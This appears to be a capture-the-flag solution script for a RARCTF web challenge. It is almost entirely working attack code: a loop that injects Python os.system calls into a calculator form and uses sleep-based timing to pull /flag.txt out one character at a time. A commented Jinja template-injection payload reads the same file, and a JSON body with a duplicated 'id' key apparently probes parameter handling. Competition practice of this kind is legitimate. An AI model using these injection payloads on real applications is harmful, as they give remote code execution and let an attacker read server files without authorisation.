import requests
import string

url="https://maas.rars.win/calculator"
flag="rarctf{"
for i in range(250):
    for char in string.ascii_letters+string.digits+'_!@}':
        print(char,end='\r')
        data = {"mode":"arithmetic","n1":"__import__(\"os\").system('","add":"+","n2":f"if fgrep -c \"{flag+char}\" \"/flag.txt\"; then sleep 2; else echo 0; fi')"}
        r =requests.post(url,data=data)

        if r.elapsed.total_seconds()>2:
            flag+=char
            print(flag)
            break


#mode=bioadd&bio={{config.__class__.__init__.__globals__['os'].popen('cat+/flag.txt').read()}}

#{"id":0,"id":2,"password":"taidhihihihehe"}